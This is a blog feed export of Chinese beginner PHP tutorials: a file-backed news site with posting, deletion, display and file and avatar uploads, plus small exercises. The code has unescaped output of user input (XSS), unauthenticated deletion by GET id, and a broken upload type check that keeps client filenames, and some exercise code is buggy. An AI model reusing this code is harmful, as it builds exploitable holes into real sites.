if(isset($_SESSION[&quot;uname&quot;]))            {                echo &quot;欢迎&quot;.$_SESSION[&quot;uname&quot;];            }            else{                echo &quot;&lt;script&gt;alert(&#39;请登陆！&#39;);location.href=&#39;../dlzc/denglu.html&#39;; &lt;/script&gt;&quot;;            }            ?&gt;        &lt;/h1&gt;    &lt;/div&gt;    &lt;form action=&quot;edit.php&quot; method=&quot;post&quot;&gt;        &lt;p&gt;标题&lt;/p&gt;        &lt;input type=&quot;text&quot; name=&quot;title&quot; placeholder=&quot;标题&quot;&gt;        &lt;p&gt;图片&lt;/p&gt;        &lt;input type=&quot;text&quot; name=&quot;img_url&quot; placeholder=&quot;请输入图片链接&quot;&gt;        &lt;p&gt;内容&lt;/p&gt;        &lt;textarea name=&quot;content&quot; placeholder=&quot;请输入内容&quot;&gt;&lt;/textarea&gt;        &lt;p&gt;评论&lt;/p&gt;        &lt;textarea name=&quot;plun&quot; placeholder=&quot;plun&quot;&gt;&lt;/textarea&gt;        &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;        &lt;br&gt;    &lt;/form&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;&lt;?php//                            0    1    2    3     4    5         6// $data数据 按照数组顺序分成：ID、标题、图片、内容、作者、发表时间、评论// 前三行的数据//var_dump($_POST);$tmp=$_POST;if($tmp==null){    die();}// 对post接受的数据进行处理// 将数据写入news.db文件$file=fopen(&quot;../data/news.db&quot;,&quot;r&quot;);if($file==null){    echo &quot;文件打开失败&quot;;    die();}// 关于文章id通过对文件进行行遍历获取当前文章的个数$num=0;// 从0开始计数while(!feof($file)){    fgets($file);// 按行读取    $num++;}fclose($file);$id=$num+1;// 分别对 标题、图片链接、内容、评论 进行编码$title=base64_encode($tmp[&quot;title&quot;]);    // 将内容进行编码去掉特殊字符$img_url=base64_encode($tmp[&quot;img_url&quot;]);$content=base64_encode($tmp[&quot;content&quot;]);$plun=base64_encode($tmp[&quot;plun&quot;]);$author=$_SESSION[&quot;uname&quot;];$_SESSION[&quot;time&quot;]=time();$time=$_SESSION[&quot;time&quot;];// 按照格式保存数据//                            0    1    2    3     4    5         6// $data数据 按照数组顺序分成：ID、标题、图片、内容、作者、发表时间、评论$data=&quot;$id||$title||$img_url||$content||$author||$time||$plun\n&quot;;// 写入文件$file=fopen(&quot;../data/news.db&quot;,&quot;a&quot;);// 追加模式if($file==null){    echo &quot;文件打开失败&quot;;    die();}fwrite($file,$data);echo &quot;&lt;script&gt;alert(&#39;新闻编辑成功！&#39;);&lt;/script&gt;&quot;;fclose($file);?&gt;</code></pre><p>效果图<br><img src="/PHP%E5%B0%8F%E9%A1%B9%E7%9B%AE/20190811021259453.png" alt></p><h2 id="7、文章删除"><a href="#7、文章删除" class="headerlink" title="7、文章删除"></a>7、文章删除</h2><h3 id="php代码逻辑-3"><a href="#php代码逻辑-3" class="headerlink" title="php代码逻辑"></a>php代码逻辑</h3><pre><code>&lt;?php// 接收传文章ID对相应的文章进行展示//var_dump($_GET);$id=$_GET[&#39;id&#39;];// 对文件数据进行读取比对相应的文章ID$file=fopen(&quot;../data/news.db&quot;,&quot;r&quot;);if($file==null){    echo &quot;文件打开失败！&quot;;    die();}while(!feof($file)){    $data=explode(&quot;||&quot;,fgets($file));// 按行读取并按照 || 分成数组存储    // 通过ID 查找相应的文章    if($data[0]==$id)    {        // 找到需要显示的文章        //                            0    1    2    3     4    5         6        // $data数据 按照数组顺序分成：ID、标题、图片、内容、作者、发表时间、评论        // 分别对 标题、图片链接、内容、评论 进行编码        // 对相应的文章进行解码        $data[1]=base64_decode($data[1]);        $data[2]=base64_decode($data[2]);        $data[3]=base64_decode($data[3]);        $data[6]=base64_decode($data[6]);        $sj=$data;    }}fclose($file);// 删除文件$file = file(&quot;../data/news.db&quot;, FILE_SKIP_EMPTY_LINES);//    var_dump($file);// 循环遍历数组for ($i = 0, $j = 0; $i &lt; count($file); $i++, $j++) {    $tmp = explode(&quot;||&quot;, $file[$i]);    if ($sj[0] == $tmp[0]) {        continue;    }    $xwzhang[$j] = $file[$i];}//var_dump($xwzhang);// 对文库重新写入$fil = fopen(&quot;../data/news.db&quot;, &quot;w&quot;);if ($fil == null) {    echo &quot;文件打开失败!&quot;;    die();}for ($i = 0; $i &lt; count($xwzhang); $i++) {    fwrite($fil, $xwzhang[$i]);}fclose($fil);echo &quot;&lt;script&gt;alert=&#39;文章删除成功！&#39;;location.href=&#39;../xianshi.php&#39;;&lt;/script&gt;&quot;;?&gt;</code></pre><h2 id="8、数据展示"><a href="#8、数据展示" class="headerlink" title="8、数据展示"></a>8、数据展示</h2><h3 id="html代码与php代码逻辑"><a href="#html代码与php代码逻辑" class="headerlink" title="html代码与php代码逻辑"></a>html代码与php代码逻辑</h3><pre><code>&lt;?phpsession_start();?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;Title&lt;/title&gt;&lt;!-- 展示页面--&gt;    &lt;style type=&quot;text/css&quot;&gt;        table{            width 80%;        }        th{            width: 300px;            text-align: center;            height: 50px;        }        td{            height: 30px;            width: 300px;            text-align: center;        }        img{            /* 修改宽或高都回自动调整图片的大小，可以自定义 */            height: 100px;        }    &lt;/style&gt;&lt;/head&gt;&lt;body &gt;    &lt;div align=&quot;left&quot;&gt;        &lt;a href=&quot;houtai/houtai.php&quot;&gt;返回&lt;/a&gt;    &lt;/div&gt;    &lt;div align=&quot;right&quot;&gt;        &lt;?php            // 判断是否登陆            if(isset($_SESSION[&#39;uname&#39;]))            {                // 判断是否修改头像                if(isset($_GET[&#39;hz&#39;]))                {                    $hz=$_GET[&#39;hz&#39;];//                  var_dump($hz);                    echo &lt;&lt;&lt;EOF        &lt;img src=&quot;upload_file/files/txiang.$hz&quot; &gt;EOF;                }                else{                    echo &lt;&lt;&lt;EOF        &lt;img src=&quot;upload_file/files/txiang.gif&quot; &gt;EOF;                }            }        ?&gt;        &lt;a href=&quot;dlzc/denglu.html&quot;&gt;登陆&lt;/a&gt;        &lt;a href=&quot;dlzc/loginout.php&quot;&gt;注销&lt;/a&gt;    &lt;/div&gt;    &lt;div align=&quot;center&quot;&gt;        &lt;br&gt;&lt;br&gt;&lt;br&gt;        &lt;h1&gt;影视榜单            &lt;?php                if(isset($_SESSION[&#39;uname&#39;]))                {                    echo &quot;欢迎&quot;.$_SESSION[&#39;uname&#39;];                }            ?&gt;        &lt;/h1&gt;        &lt;br&gt;&lt;br&gt;        &lt;hr&gt;        &lt;table border=&quot;1&quot;&gt;            &lt;tr&gt;                &lt;th&gt;ID&lt;/th&gt;                &lt;th&gt;标题/图片&lt;/th&gt;                &lt;th&gt;内容&lt;/th&gt;                &lt;th&gt;作者&lt;/th&gt;                &lt;th&gt;发表时间&lt;/th&gt;                &lt;th&gt;评论&lt;/th&gt;            &lt;/tr&gt;            &lt;?php            $file=fopen(&#39;data/news.db&#39;,&#39;r&#39;);            if ($file==null)            {                echo &quot;文件打开失败&quot;;                return;            }            $i=0;            while(!feof($file))            {                $temp=fgets($file);                $data=explode(&quot;||&quot;,$temp);                if(count($data)!=7)                {                    continue;                }                if($i&lt;3)                {                    echo_info($data);                }else{                    echo_zhihou($data);                }                $i++;            }            ?&gt;        &lt;/table&gt;    &lt;/div&gt;&lt;/body&gt;&lt;/html&gt;&lt;?php//                            0    1    2    3     4    5         6// $data数据 按照数组顺序分成：ID、标题、图片、内容、作者、发表时间、评论    // 前三行的数据    function echo_info($data)    {        // 分别对 标题、图片链接、内容、评论 解码//        $data[1]=base64_decode($data[1]);// 标题        $data[2]=base64_decode($data[2]);// 图片        $data[3]=base64_decode($data[3]);// 内容        $data[6]=base64_decode($data[6]);// 评论        $data[3]=substr($data[3],0,120).&#39;...&#39;;        $data[5]=date(&quot;Y-m-d&quot;,$data[5]) ;        echo &lt;&lt;&lt;EOF            &lt;tr&gt;                &lt;td&gt;$data[0]&lt;/td&gt;                &lt;td&gt;                    &lt;a href=&quot;xxzshi.php?id=$data[0]&quot;&gt; &lt;img src=&quot;$data[2]&quot; &gt;&lt;/a&gt;                &lt;/td&gt;                &lt;td&gt;$data[3]&lt;/td&gt;                &lt;td&gt;$data[4]&lt;/td&gt;                &lt;td&gt;$data[5]&lt;/td&gt;                &lt;td&gt;$data[6]&lt;/td&gt;            &lt;/tr&gt;EOF;    }    // 三行之后的数据    function echo_zhihou($data)    {        // 分别对 标题、图片链接、内容、评论 解码        $data[1]=base64_decode($data[1]);// 标题//        $data[2]=base64_decode($data[2]);// 图片        $data[3]=base64_decode($data[3]);// 内容        $data[6]=base64_decode($data[6]);// 评论        $data[3]=substr($data[3],0,120).&#39;...&#39;;        $data[5]=date(&quot;Y-m-d&quot;,$data[5]) ;        echo &lt;&lt;&lt;EOF            &lt;tr&gt;                &lt;td&gt;$data[0]&lt;/td&gt;                &lt;td&gt;                &lt;a href=&quot;xxzshi.php?id=$data[0]&quot;&gt;$data[1]&lt;/a&gt;                &lt;/td&gt;                &lt;td&gt;$data[3]&lt;/td&gt;                &lt;td&gt;$data[4]&lt;/td&gt;                &lt;td&gt;$data[5]&lt;/td&gt;                &lt;td&gt;$data[6]&lt;/td&gt;            &lt;/tr&gt;EOF;    }?&gt;</code></pre><p>效果图<br><img src="/PHP%E5%B0%8F%E9%A1%B9%E7%9B%AE/20190811024340580.png" alt></p><h2 id="9、数据详细展示"><a href="#9、数据详细展示" class="headerlink" title="9、数据详细展示"></a>9、数据详细展示</h2><h3 id="html代码和php代码逻辑"><a href="#html代码和php代码逻辑" class="headerlink" title="html代码和php代码逻辑"></a>html代码和php代码逻辑</h3><pre><code>&lt;?phpsession_start();//                            0    1    2    3     4    5         6// $data数据 按照数组顺序分成：ID、标题、图片、内容、作者、发表时间、评论// 接收传文章ID对相应的文章进行展示//var_dump($_GET);$id=$_GET[&#39;id&#39;];// 对文件数据进行读取比对相应的文章ID$file=fopen(&quot;data/news.db&quot;,&quot;r&quot;);if($file==null){    echo &quot;文件打开失败！&quot;;    die();}while(!feof($file)){    $data=explode(&quot;||&quot;,fgets($file));// 按行读取并按照 || 分成数组存储    // 通过ID 查找相应的文章    if($data[0]==$id)    {        // 找到需要显示的文章        //                            0    1    2    3     4    5         6        // $data数据 按照数组顺序分成：ID、标题、图片、内容、作者、发表时间、评论        // 分别对 标题、图片链接、内容、评论 进行编码        // 对相应的文章进行解码        $data[1]=base64_decode($data[1]);        $data[2]=base64_decode($data[2]);        $data[3]=base64_decode($data[3]);        $data[6]=base64_decode($data[6]);        $sj=$data;    }}fclose($file);//// 删除文件//function delete_wz($sj)//{//    $file =file(&quot;data/news.db&quot;,FILE_SKIP_EMPTY_LINES);////    var_dump($file);//// 循环遍历数组//    for($i=0,$j=0;$i&lt;count($file);$i++,$j++)//    {//        $tmp=explode(&quot;||&quot;,$file[$i]);//        if($sj[0]==$tmp[0])//        {//            continue;//        }//        $xwzhang[$j]=$file[$i];//    }//    //var_dump($xwzhang);//    // 对文库重新写入//    $fil=fopen(&quot;data/news.db&quot;,&quot;w&quot;);//    if($fil==null)//    {//        echo &quot;文件打开失败!&quot;;//        die();//    }//    for($i=0;$i&lt;count($xwzhang);$i++)//    {//        fwrite($fil,$xwzhang[$i]);//    }//    fclose($fil);//}?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;        &lt;?php        echo $sj[1];        ?&gt;    &lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;div&gt;        &lt;div align=&quot;center&quot;&gt;            &lt;h1&gt;                &lt;?php echo $sj[1];?&gt;            &lt;/h1&gt;        &lt;/div&gt;        &lt;div align=&quot;center&quot;&gt;            &lt;hr size=&quot;10&quot; color=&quot;black&quot;&gt;            &lt;p&gt;                &lt;?php echo $sj[3];?&gt;            &lt;/p&gt;            &lt;p&gt;                &lt;?php echo $sj[6];?&gt;            &lt;/p&gt;        &lt;/div&gt;        &lt;hr&gt;        &lt;div align=&quot;right&quot;&gt;            &lt;p&gt;                &lt;?php echo $sj[4]?&gt;            &lt;/p&gt;            &lt;p&gt;                &lt;?php echo date(&quot;Y-m-d&quot;,$sj[5]) ;?&gt;            &lt;/p&gt;            &lt;?php echo &lt;&lt;&lt;EOF            &lt;a href=&quot;houtai/delete_wzhang.php?id=$sj[0]&quot;&gt;删除该文章&lt;/a&gt;EOF;            ?&gt;        &lt;/div&gt;    &lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>效果图<br><img src="/PHP%E5%B0%8F%E9%A1%B9%E7%9B%AE/20190811024546993.png" alt></p><h2 id="10、文件上传"><a href="#10、文件上传" class="headerlink" title="10、文件上传"></a>10、文件上传</h2><h3 id="html代码-2"><a href="#html代码-2" class="headerlink" title="html代码"></a>html代码</h3><pre><code>&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;Title&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;div align=&quot;center&quot;&gt;    &lt;div align=&quot;left&quot;&gt;        &lt;a href=&quot;../houtai/houtai.php&quot;&gt;            &lt;button &gt;返回&lt;/button&gt;        &lt;/a&gt;    &lt;/div&gt;    &lt;form enctype=&quot;multipart/form-data&quot; action=&quot;upload.php&quot; method=&quot;post&quot;&gt;        &lt;input type=&quot;file&quot; name=&quot;tuhua&quot; value=&quot;&quot;&gt;        &lt;input type=&quot;submit&quot;&gt;    &lt;/form&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>效果图<br><img src="/PHP%E5%B0%8F%E9%A1%B9%E7%9B%AE/20190811024802012.png" alt></p><h3 id="php代码逻辑-4"><a href="#php代码逻辑-4" class="headerlink" title="php代码逻辑"></a>php代码逻辑</h3><pre><code>&lt;?php$file=$_FILES;//var_dump($file);// $_FILE[&quot;file&quot;][&quot;error&quot;]   file是在上传表单中 定义的字符      &lt;input type=&quot;file&quot; name=&quot;tuhua&quot; value=&quot;&quot;&gt;//if($_FILES[&quot;tuhua&quot;][&quot;error&quot;]&gt;0)////{////    echo &quot;错误:&quot;.$_FILES[&quot;tuhua&quot;][&quot;error&quot;].&quot;&lt;br&gt;&quot;;////}else{////    echo &quot;文件名&quot;.$_FILES[&quot;tuhua&quot;][&quot;name&quot;].&quot;&lt;br&gt;&quot;;////    echo &quot;文件类型&quot;.$_FILES[&quot;tuhua&quot;][&quot;name&quot;].&quot;&lt;br&gt;&quot;;////    echo &quot;文件大小&quot;.($_FILES[&quot;tuhua&quot;][&quot;size&quot;]/1024).&quot;KB&lt;br&gt;&quot;;////    echo &quot;上传位置&quot;.$_FILES[&quot;tuhua&quot;][&quot;tmp_name&quot;];////}// 设置上传限制$allowfile=array(&quot;gif&quot;,&quot;jpeg&quot;,&quot;jpg&quot;,&quot;png&quot;);// 只允许常见图片和动图上传// 获取文件的后缀名$temp=explode(&quot;.&quot;,$file[&quot;tuhua&quot;][&quot;tmp_name&quot;]);$hzhui=end($temp);if(($file[&quot;tuhua&quot;][&quot;type&quot;]==&quot;image/gif&quot;)||    ($file[&quot;tuhua&quot;][&quot;type&quot;]==&quot;image/jpeg&quot;)||    ($file[&quot;tuhua&quot;][&quot;type&quot;]==&quot;image/jpg&quot;)||    ($file[&quot;tuhua&quot;][&quot;type&quot;]==&quot;image/pjpeg&quot;)||    ($file[&quot;tuhua&quot;][&quot;type&quot;]==&quot;image/x-png&quot;)||    ($file[&quot;tuhua&quot;][&quot;type&quot;]==&quot;image/png&quot;)&amp;&amp;    ($file[&quot;tuhua&quot;][&quot;size&quot;]&lt;204800)// 小于 200kb 这里是按字节计算    &amp;&amp;in_array($hzhui,$allowfile)){    if ($file[&quot;tuhua&quot;][&quot;error&quot;]&gt;0)    {        echo &quot;错误&quot;.$file[&#39;tuhua&#39;][&quot;error&quot;].&quot;&lt;br&gt;&quot;;    }    else{        if($_FILES[&quot;tuhua&quot;][&quot;error&quot;]&gt;0)        {            echo &quot;错误:&quot;.$_FILES[&quot;tuhua&quot;][&quot;error&quot;].&quot;&lt;br&gt;&quot;;        }else{            // 正确的文件格式和限制内的文件大小            // 显示上文件的相关信息            echo &quot;文件名&quot;.$_FILES[&quot;tuhua&quot;][&quot;name&quot;].&quot;&lt;br&gt;&quot;;            echo &quot;文件类型&quot;.$_FILES[&quot;tuhua&quot;][&quot;name&quot;].&quot;&lt;br&gt;&quot;;            echo &quot;文件大小&quot;.($_FILES[&quot;tuhua&quot;][&quot;size&quot;]/1024).&quot;KB&lt;br&gt;&quot;;            echo &quot;上传位置&quot;.$_FILES[&quot;tuhua&quot;][&quot;tmp_name&quot;];            // 对上传文件进行文件保存            // 判断目标文件夹下是否存在相同的文件防止重复上传            // 如果没有相关的文件夹，创建文件夹并修改需要的相应权限            if(file_exists(&quot;files/&quot;.$file[&quot;tuhua&quot;][&quot;name&quot;]))            {                // 文件存在                echo &quot;&lt;script&gt;alert(&#39;文件已存在，请勿重复上传&#39;);location.href=&#39;upload.html&#39;&lt;/script&gt;&quot;;            }            else{                // 文件不存在 进行文件保存                // 原理是对上传得临时文件复制保存到目标位置                move_uploaded_file($file[&quot;tuhua&quot;][&quot;tmp_name&quot;]/*上传的临时文件路径*/,                &quot;files/&quot;.$file[&quot;tuhua&quot;][&quot;name&quot;]/*目标文件夹下的文件名*/);                echo &lt;&lt;&lt;EOF            &lt;script&gt;alert(&#39;文件上传成功&#39;);location.href=&quot;upload.html&quot;&lt;/script&gt;;EOF;            }        }    }}else{    echo &quot;请提交正确的文件格式&quot;;}</code></pre><h2 id="11、头像上传"><a href="#11、头像上传" class="headerlink" title="11、头像上传"></a>11、头像上传</h2><h3 id="html代码借用上传的头像html"><a href="#html代码借用上传的头像html" class="headerlink" title="html代码借用上传的头像html"></a>html代码借用上传的头像html</h3><h3 id="php逻辑代码"><a href="#php逻辑代码" class="headerlink" title="php逻辑代码"></a>php逻辑代码</h3><pre><code>&lt;?php$file=$_FILES;// 获取文件的后缀名//$temp=explode(&quot;.&quot;,$file[&quot;txiang&quot;][&quot;type&quot;]);//$hzhui=end($temp);//var_dump($hzhui);//var_dump($temp);if(($file[&quot;txiang&quot;][&quot;type&quot;]==&quot;image/gif&quot;)||    ($file[&quot;txiang&quot;][&quot;type&quot;]==&quot;image/jpeg&quot;)||    ($file[&quot;txiang&quot;][&quot;type&quot;]==&quot;image/jpg&quot;)||    ($file[&quot;txiang&quot;][&quot;type&quot;]==&quot;image/pjpeg&quot;)||    ($file[&quot;txiang&quot;][&quot;type&quot;]==&quot;image/x-png&quot;)||    ($file[&quot;txiang&quot;][&quot;type&quot;]==&quot;image/png&quot;)    &amp;&amp;in_array($hzhui,$allowfile)){    if ($file[&quot;txiang&quot;][&quot;error&quot;]&gt;0)    {        echo &quot;错误&quot;.$file[&#39;txiang&#39;][&quot;error&quot;].&quot;&lt;br&gt;&quot;;    }    else{        if($_FILES[&quot;txiang&quot;][&quot;error&quot;]&gt;0)        {            echo &quot;错误:&quot;.$_FILES[&quot;txiang&quot;][&quot;error&quot;].&quot;&lt;br&gt;&quot;;        }else{            $tmp=explode(&quot;.&quot;,$file[&quot;txiang&quot;][&quot;type&quot;]);            var_dump($tmp);            $h=end($tmp);            $hzhui=explode(&quot;/&quot;,$h);            var_dump($hzhui);            $wjhzhui=$hzhui[1];            var_dump($wjhzhui);            // 对上传文件进行文件保存            // 文件不存在 进行文件保存            // 原理是对上传得临时文件复制保存到目标位置            move_uploaded_file($file[&quot;txiang&quot;][&quot;tmp_name&quot;]/*上传的临时文件路径*/,                &quot;files/txiang.&quot;.$wjhzhui/*目标文件夹下的文件名*/);            echo &lt;&lt;&lt;EOF        &lt;script&gt;alert(&#39;文件上传成功&#39;);location.href=&quot;../xianshi.php?hz=$wjhzhui&quot;;&lt;/script&gt;;EOF;        }    }}else{    echo &quot;请提交正确的文件格式&quot;;}</code></pre><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><h2 id="吐嘈"><a href="#吐嘈" class="headerlink" title="吐嘈"></a>吐嘈</h2><p>php有很多的功能可以使用已有的函数去实现，节省了很多在实际开发中的时间，但是由于函数功能很多不可能在短时间能完全掌握只能用到就查的方式，整体上手难度不大。<br>环境方面，现在使用的是phpstrom进行文件编写，如果进行代码验证会间歇性出现502页面，这就有点烦。又因为php和html等一样属于前端语言，动态调试比较麻烦，虽然有很酷的显示是，但是代码调试方面做得不如vs那样方便。有点不爽，这个小型的项目写下来，不过半天的时间，可调试却花掉了大半的时间。真是应了那句话，用20%的时间用来写BUG用80%的时间用来调试。</p><h2 id="踩过的坑"><a href="#踩过的坑" class="headerlink" title="踩过的坑"></a>踩过的坑</h2><p>1。注意文件占用问题，一个文件如果处于被打开状态是不能被再次打开的<br>2。注意变量重名问题，在逻辑没有问题的前提下，如果变量不慎重名，那这种在循环中逻辑bug就真的要靠足够的耐心、细致才可以搞定<br>3。注意php和html等前端语言在一起时运行的逻辑顺序。不然会出现无语法问题的逻辑BUG<br>4。注意文件组织结构和分类存储，不然在项目达到一定程度后寻找相关的功能代码文件就会是一件令人抓狂的过程。</p>]]></content>
      
      
      <categories>
          
          <category> i春秋 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 第四周 </tag>
            
            <tag> 代码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP代码练习</title>
      <link href="/2019/08/07/PHP%E4%BB%A3%E7%A0%81%E7%BB%83%E4%B9%A0/"/>
      <url>/2019/08/07/PHP%E4%BB%A3%E7%A0%81%E7%BB%83%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="素数查找"><a href="#素数查找" class="headerlink" title="素数查找"></a>素数查找</h1><pre><code>// 素数:只能被1和自身整除for($i=1;$i&lt;100;$i++){    for($j=1;$j&lt;$i;$j++)    {        if(($i%$j)==0)        {            $i++;            continue; //不是继续查找        }    }    echo $i.&quot;\n&quot;;}</code></pre><h1 id="三元排大小"><a href="#三元排大小" class="headerlink" title="三元排大小"></a>三元排大小</h1><pre><code>echo &quot;&lt;br&gt;&quot;;($a==$b&amp;&amp;$b==$c)?(    print &quot;$a=$b=$c&quot;):(    ($a==$b)?(        ($a&gt;$c)?(            print &quot;$a=$b&gt;$c&quot;        ):(            print &quot;$c&gt;$a=$b&quot;        )    ):(        ($a==$c)?(            ($a&gt;$b)?(                print &quot;$a=$c&gt;$b&quot;            ):(                print &quot;$b&gt;$a=$c&quot;            )        ):(        ($b==$c)?(            ($a&gt;$b)?(                print &quot;$a&gt;$b=$c&quot;            ):(                print &quot;$b=$c&gt;$a&quot;            )            ):(                ($a&gt;$b)? (($a&gt;$c)? (($c&gt;$b)? (print &quot;$a&gt;$c&gt;$b&quot;):(print &quot;$a&gt;$b&gt;$c&quot;)):(print &quot;$c&gt;$a&gt;$b&quot;)):(($b&gt;$c)? (($a&gt;$c)? (print &quot;$b&gt;$a&gt;$c&quot;):(print &quot;$b&gt;$c&gt;$a&quot;)):(print &quot;$c&gt;$b&gt;$a&quot;))            )        )    ));</code></pre><h1 id="五角星"><a href="#五角星" class="headerlink" title="五角星"></a>五角星</h1><pre><code>  for($i1=1;$i1&lt;7;$i1++)             /*这是五角星的上面一个角*/        {            for($j1=1;$j1&lt;19-$i1;$j1++)     /*这是空格*/                printf(&quot; &quot;);            for($k1=1;$k1&lt;=2*$i1-1;$k1++)   /*这是“*”*/                printf(&quot;*&quot;);            printf(&quot;\n&quot;);        }        for($i2=1;$i2&lt;5;$i2++)     /*这是五角星的中间两个角*/        {            for($j2=1;$j2&lt;3*$i2-3;$j2++)                printf(&quot; &quot;);            for($k2=1;$k2&lt;=42-6*$i2;$k2++)                printf(&quot;*&quot;);            printf(&quot;\n&quot;);        }        for($i3=1;$i3&lt;3;$i3++)        //这是中间与下部相接的部分        {            for($j3=1;$j3&lt;12-$i3;$j3++)                printf(&quot; &quot;);            for($k3=1;$k3&lt;=12+2*$i3;$k3++)                printf(&quot;*&quot;);            printf(&quot;\n&quot;);        }                for($i4=1;$i4&lt;5;$i4++)         // 这是五角星的下面两个角                {                    for($j4=1;$j4&lt;10-$i4;$j4++)                        printf(&quot; &quot;);                    for($k4=1;$k4&lt;=10-2*$i4;$k4++)                        printf(&quot;*&quot;);                    for($m4=1;$m4&lt;6*$i4-3;$m4++)                        printf(&quot; &quot;);                    for($n4=1;$n4&lt;=10-2*$i4;$n4++)                        printf(&quot;*&quot;);                    printf(&quot;\n&quot;);                }</code></pre><p><img src="/PHP%E4%BB%A3%E7%A0%81%E7%BB%83%E4%B9%A0/20190807055324467.png" alt></p><h1 id="for循环实现关联数组的遍历"><a href="#for循环实现关联数组的遍历" class="headerlink" title="for循环实现关联数组的遍历"></a>for循环实现关联数组的遍历</h1><pre><code>$arr=[&#39;q&#39;=&gt;&#39;12&#39;,&#39;w&#39;=&gt;&#39;13&#39;,&#39;e&#39;=&gt;&#39;14&#39;,&#39;r&#39;=&gt;&quot;15&quot;];$num=count($arr);for($i=0;$i&lt;$num;$i++){    echo key($arr).&quot;=&gt;&quot;.current($arr).&quot;\n&quot;;    next($arr);}</code></pre><h1 id="通过文件读写对HTML表格的操作"><a href="#通过文件读写对HTML表格的操作" class="headerlink" title="通过文件读写对HTML表格的操作"></a>通过文件读写对HTML表格的操作</h1><pre><code>&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;  &gt;    &lt;title&gt;news&lt;/title&gt;&lt;/head&gt;&lt;body background=&quot;img/2.jpg&quot;&gt;&lt;table border=&quot;1&quot; width=&quot;100%&quot; cellspacing=&quot;10&quot; cellpadding=&quot;10&quot; align=&quot;center &quot; bgcolor=&quot;#6495ed&quot;&gt;        &lt;tr&gt;            &lt;th id=&quot;pm&quot;&gt;排名&lt;/th&gt;            &lt;th id=&quot;mz&quot;&gt;名字&lt;/th&gt;            &lt;th id=&quot;jj&quot;  bgcolor=&quot;#a52a2a&quot;&gt;简介&lt;/th&gt;            &lt;th id=&quot;ss&quot;&gt;搜索指数&lt;/th&gt;        &lt;/tr&gt;        &lt;?php            // 打开数据文件            $file=fopen(&quot;/Project/PHP/news/data/new.db&quot;,&quot;r&quot;);            if($file==null)            {                echo &quot;文件打开失败&quot;;                die();            }            $str=fgets($file);  // 去掉表格标题            $i=0;            while(!feof($file))            {                $str=fgets($file);                $data=explode(&#39;||&#39;,$str);// 获取字符串按 || 分割成数组                if($i&lt;3)                {                    // 前三行调用图片和简介                    table_qiansan($data);                }                else{                    table_fun($data);// 调用自定义函数                }                $i++;            }            fclose($file);        ?&gt;&lt;/table&gt;&lt;/body&gt;&lt;/html&gt;&lt;?php// 三行前的信息读取// 分别显示 id 图片 简介function table_qiansan($data){    $data[2]=substr( $data[2],0,200);    echo &lt;&lt;&lt;EOF    &lt;tr&gt;        &lt;td&gt;$data[0]&lt;/td&gt;        &lt;td&gt;&lt;img src=&quot;img/1.jpg&quot;&gt;&lt;/td&gt;        &lt;td colspan=&quot;2&quot;&gt;$data[2]&lt;/td&gt;    &lt;/tr&gt;EOF;}// 三行后的信息function table_fun($data){  echo &lt;&lt;&lt;EOF  &lt;tr&gt;    &lt;td&gt;$data[0]&lt;/td&gt;    &lt;td&gt;$data[1]&lt;/td&gt;    &lt;td&gt;$data[2]&lt;/td&gt;    &lt;td&gt;$data[3]&lt;/td&gt;  &lt;/tr&gt;;EOF;}?&gt;</code></pre><p>效果图<br><img src="/PHP%E4%BB%A3%E7%A0%81%E7%BB%83%E4%B9%A0/20190807083753363.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> i春秋 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 第四周 </tag>
            
            <tag> 代码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP</title>
      <link href="/2019/08/04/PHP/"/>
      <url>/2019/08/04/PHP/</url>
      
        <content type="html"><![CDATA[<p>php不能独立运行，需要依赖中间件进行处理常用中间件Apache和Nginx</p><h1 id="php规则"><a href="#php规则" class="headerlink" title="php规则"></a>php规则</h1><p>php脚本以 <?php 开始，以?>结束 ?&gt;可以没有<br>php脚本可以单独存在也可以与HTML页面结合<br>php的规则很重要，对于研究文件上传有帮助，中间件的配置则关系到PHP文件的解析问题。<br>** php变量区分大小写，以 $ 开头 **<br>** false true null 不区分大小写 **</p><h2 id="php流程"><a href="#php流程" class="headerlink" title="php流程"></a>php流程</h2><p>php会将所有的输出显示到html当中。在输出中会进行HTML标签格式化。php输出的就是网页的源代码。</p><h3 id="php的执行方式"><a href="#php的执行方式" class="headerlink" title="php的执行方式"></a>php的执行方式</h3><p>1。通过中间件<br>2。在命令行<br>3。在客户端输出</p><h3 id="php的输入输出"><a href="#php的输入输出" class="headerlink" title="php的输入输出"></a>php的输入输出</h3><p>php用 . 连接字符串</p><h4 id="EOF-‘’-“”-区别"><a href="#EOF-‘’-“”-区别" class="headerlink" title="EOF ‘’ “” 区别"></a>EOF ‘’ “” 区别</h4><pre><code>    EOF 不影响里面的内容，同时EOF可以换成其他的字符是一种在命令行shell和程序语言里定义一个字符串的方法    格式：    &lt;&lt;&lt;AAA    AAA;规则：    1。必须后解分号    2。EOF可以其他字符代替，但必须保证开始和结束一致    3。结束标签独占一行，必须从首行开始后不接任何空白和字符    &#39;&#39;  内的所有特殊意义的字符都无效，除了 &#39;&#39; 它自己    &quot;&quot;  内的所有特殊意义的字符都有效</code></pre><h4 id="服务端的输入"><a href="#服务端的输入" class="headerlink" title="服务端的输入"></a>服务端的输入</h4><pre><code>$_GET[]$_POST[]$_REQUEST[]  </code></pre><h4 id="客户端的输入"><a href="#客户端的输入" class="headerlink" 